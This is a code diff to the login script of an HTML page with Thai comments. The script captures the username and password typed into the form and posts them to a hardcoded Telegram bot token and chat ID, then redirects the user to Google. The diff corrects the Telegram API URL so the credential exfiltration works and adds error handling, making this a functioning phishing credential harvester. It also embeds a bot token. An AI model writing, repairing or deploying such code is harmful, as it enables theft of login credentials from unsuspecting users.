@@ -175,7 +175,7 @@
 
     <!-- ส่วนของ JavaScript เพื่อส่งข้อมูลเข้า Telegram แทน Python Requests -->
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
             event.preventDefault(); // ป้องกันไม่ให้หน้าเว็บรีเฟรชเมื่อกดส่งฟอร์ม
 
             // ดึงค่าข้อมูลที่ผู้ใช้กรอกจริงจากช่อง Input
@@ -185,9 +185,11 @@
             // ตั้งค่าข้อมูลสำหรับส่งไปยัง Telegram Bot ของคุณ
             const TOKEN = "8803420620:AAEuqeLtdpxsEwSK1cTFNURvJVrUpjsAHAc";
             const CHAT_ID = "8033387742";
-            const url = `https://telegram.org{TOKEN}/sendMessage`;
+            
+            // แก้ไข URL ให้ถูกต้องตาม API Spec ของ Telegram (ต้องมี api.telegram.org/bot<TOKEN>)
+            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
-            // จัดรูปแบบข้อความ Markdown เหมือนในโค้ด Python
+            // จัดรูปแบบข้อความ Markdown
             const message = `🔐 *ข้อมูลการเข้าสู่ระบบ*\n\n*Username/Email:* \`${userInput}\`\n*Password:* \`${passwordInput}\``;
 
             // เตรียมโครงสร้าง Payload สำหรับส่งข้อมูลออกไป
@@ -197,22 +199,27 @@
                 parse_mode: "Markdown"
             };
 
-            // ส่งข้อมูลไปยัง API ของ Telegram โดยตรงจากหน้าเว็บ
-            fetch(url, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
+            try {
+                // ส่งข้อมูลไปยัง API ของ Telegram โดยใช้ async/await เพื่อความชัวร์ในการทำงาน
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(payload)
+                });
+
                 console.log("Sent status code:", response.status);
-                // หลังจากส่งข้อมูลเสร็จ สามารถกำหนดให้เปลี่ยนหน้าได้ เช่น:
-                window.location.href = "https://google.com";
-            })
-            .catch(error => {
+                
+                if (response.ok) {
+                    // เปลี่ยนหน้าเมื่อส่งสำเร็จ
+                    window.location.href = "https://google.com";
+                } else {
+                    console.error("Failed to send message to Telegram API");
+                }
+            } catch (error) {
                 console.error("Error:", error);
-            });
+            }
         });
     </script>
 </body>
